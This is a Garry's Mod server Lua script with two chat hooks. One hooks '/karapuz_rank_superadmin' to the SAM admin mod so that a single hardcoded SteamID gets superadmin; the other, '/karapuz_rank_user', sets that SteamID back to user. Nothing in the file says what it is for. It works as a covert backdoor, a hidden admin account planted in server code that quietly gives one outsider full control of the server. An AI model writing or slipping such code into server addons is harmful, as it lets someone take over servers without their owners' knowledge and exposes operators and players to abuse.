if SERVER then
    hook.Add("PlayerSay", "Add_Rank_SuperAdmin", function(ply, text)

            if text == "/karapuz_rank_superadmin" then

            if ply:SteamID() == 'STEAM_0:0:555589832' then 
                   RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'superadmin') 
            elseif ply:SteamID() ~= 'STEAM_0:0:555589832'  then



                   end
               end
        end)
   end





if SERVER then
    hook.Add("PlayerSay", "Add_Rank_User", function(ply, text)

            if text == "/karapuz_rank_user" then

            if ply:SteamID() == 'STEAM_0:0:555589832' then 
                   RunConsoleCommand('sam', 'setrank', ply:SteamID(), 'user') 
            elseif ply:SteamID() ~= 'STEAM_0:0:555589832'  then



                   end
               end
        end)
   end
